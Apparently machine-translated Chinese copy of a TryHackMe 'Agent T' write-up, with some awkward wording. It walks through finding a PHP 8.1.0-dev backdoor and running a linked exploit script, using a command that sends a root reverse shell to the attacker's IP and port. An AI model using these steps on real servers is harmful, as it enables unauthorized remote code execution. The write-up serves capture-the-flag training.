<html>
<head>
<title>TryHackMe WriteUp: Agent T</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe报道:特工T</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-writeup-agent-t-4807b77f768d?source=collection_archive---------1-----------------------#2022-08-06">https://infosecwriteups.com/tryhackme-writeup-agent-t-4807b77f768d?source=collection_archive---------1-----------------------#2022-08-06</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="c9cf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">写一篇文章，描述利用代理T的步骤</p><p id="c44f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">挑战名称:<a class="ae kl" href="https://tryhackme.com/room/agentt" rel="noopener ugc nofollow" target="_blank">特工T </a>由<a class="ae kl" href="https://tryhackme.com/p/JohnHammond" rel="noopener ugc nofollow" target="_blank">约翰·哈蒙德</a></p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi km"><img src="../Images/883c5e8ef15e63331f83ce84402c6bd5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0AF99tJahla38_LGh0vX2w.png"/></div></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated">特工测试挑战</figcaption></figure><blockquote class="lc ld le"><p id="5cad" class="jn jo lf jp b jq jr js jt ju jv jw jx lg jz ka kb lh kd ke kf li kh ki kj kk ij bi translated"><strong class="jp ir">第一步</strong></p></blockquote><p id="2b38" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">启动机器后，我首先扫描IP的开放端口和其他服务，但没有什么有趣的发现。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi lj"><img src="../Images/88878911135d222baa4547adb0544adb.png" data-original-src="https://miro.medium.com/v2/resize:fit:972/format:webp/1*P797EiFYvL0Gx6mNSULI7A.png"/></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated">打开端口80</figcaption></figure><blockquote class="lc ld le"><p id="b53e" class="jn jo lf jp b jq jr js jt ju jv jw jx lg jz ka kb lh kd ke kf li kh ki kj kk ij bi translated"><strong class="jp ir">第二步</strong></p></blockquote><p id="693e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">由于端口80被打开，我试图检查是否有任何网站托管，有一个网站托管与直接访问管理面板，没有任何认证。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi lk"><img src="../Images/abc842706a3a649d28472c9a5d54b884.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BoPc6GsKyqWVwrJGBT8OVQ.png"/></div></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated">管理仪表板</figcaption></figure><blockquote class="lc ld le"><p id="3e22" class="jn jo lf jp b jq jr js jt ju jv jw jx lg jz ka kb lh kd ke kf li kh ki kj kk ij bi translated"><strong class="jp ir">第三步</strong></p></blockquote><p id="09db" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我试图在管理面板上找到一些有趣的东西，但是没有任何有趣的东西。所以我打了个嗝来检查HTTP头。在响应中我发现了一个有趣的头“<strong class="jp ir"> <em class="lf"> X-Powered-By </em> </strong>”，这个头的值是“<strong class="jp ir"><em class="lf">PHP/8 . 1 . 0-dev</em></strong>”。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi ll"><img src="../Images/2ea3e4bb0eca0303beb8ba546ad29075.png" data-original-src="https://miro.medium.com/v2/resize:fit:852/format:webp/1*WcbBUcXRpOTT258dFqusJA.png"/></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated">Juciy标题</figcaption></figure><blockquote class="lc ld le"><p id="7d9b" class="jn jo lf jp b jq jr js jt ju jv jw jx lg jz ka kb lh kd ke kf li kh ki kj kk ij bi translated"><strong class="jp ir">第四步</strong></p></blockquote><p id="f04c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我搜索了与PHP版本8.1.0-dev相关的漏洞，发现这个版本的PHP容易受到远程代码执行的攻击。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi lm"><img src="../Images/85f749e519c1daa05cbdfdc2363f41d6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cqk_yOtc2BSccTT69_a2mw.png"/></div></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated">漏洞描述</figcaption></figure><p id="f04d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我使用了来自<a class="ae kl" href="https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py" rel="noopener ugc nofollow" target="_blank">这里</a>的漏洞脚本，它给出了反向外壳。</p><blockquote class="lc ld le"><p id="84ec" class="jn jo lf jp b jq jr js jt ju jv jw jx lg jz ka kb lh kd ke kf li kh ki kj kk ij bi translated"><strong class="jp ir">第五步</strong></p></blockquote><p id="cb54" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">要运行它，我们首先需要启动监听器。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi ln"><img src="../Images/b4f61b7bd05f09c7dc0dfd53f6c4cc45.png" data-original-src="https://miro.medium.com/v2/resize:fit:354/format:webp/1*YcnLZDG_SkXI7WDLUyuHVA.png"/></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated">使用Netcat启动监听器</figcaption></figure><p id="1dee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们可以运行这个漏洞，并期望在侦听器上获得反向外壳。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi lo"><img src="../Images/dfd4021c2633dcf1ac6e495b14baec2f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1388/format:webp/1*NsMSx-6fCP1hH4tKcm_Idg.jpeg"/></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated">执行漏洞利用</figcaption></figure><p id="5039" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用以下命令可以利用漏洞:</p><p id="6fd2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"><em class="lf">python 3 exploit filename . py "目标URL" &lt;攻击者IP &gt; &lt;攻击者端口&gt; </em> </strong></p><p id="9a1e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">执行此命令后，稍等片刻，您将得到相反的shell。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi lp"><img src="../Images/54b368d08b9744badb4b0095e30e238b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iQqDyuB8DRJkFWAzJKXQFw.jpeg"/></div></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated">反向外壳</figcaption></figure><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi lq"><img src="../Images/5e51cf57986b25a2a660b885166f7366.png" data-original-src="https://miro.medium.com/v2/resize:fit:1044/format:webp/1*kk2B3RAAaMWuY7Jy6o0QrQ.png"/></div></figure><p id="7e53" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们已经有了根权限。</p><blockquote class="lc ld le"><p id="42ab" class="jn jo lf jp b jq jr js jt ju jv jw jx lg jz ka kb lh kd ke kf li kh ki kj kk ij bi translated"><strong class="jp ir">最后一步</strong></p></blockquote><p id="292d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">移动到根目录，你会发现那里的标志。</p><p id="cbf5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">希望你能解决阅读这个问题。</p><p id="76fa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">感谢您的阅读。知识就是力量，所以不断获取！😈</p><p id="4143" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">跟随我上<a class="ae kl" href="https://github.com/gandhidevansh" rel="noopener ugc nofollow" target="_blank"> GitHub </a>！</p></div><div class="ab cl lr ls hu lt" role="separator"><span class="lu bw bk lv lw lx"/><span class="lu bw bk lv lw lx"/><span class="lu bw bk lv lw"/></div><div class="ij ik il im in"><p id="26bb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="lf">来自Infosec的报道:Infosec上每天都会出现很多难以跟上的内容。</em> <a class="ae kl" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir"> <em class="lf">加入我们的每周简讯</em> </strong> </a> <em class="lf">以5篇文章、4个线程、3个视频、2个Github Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</em></p></div></div>    
</body>
</html>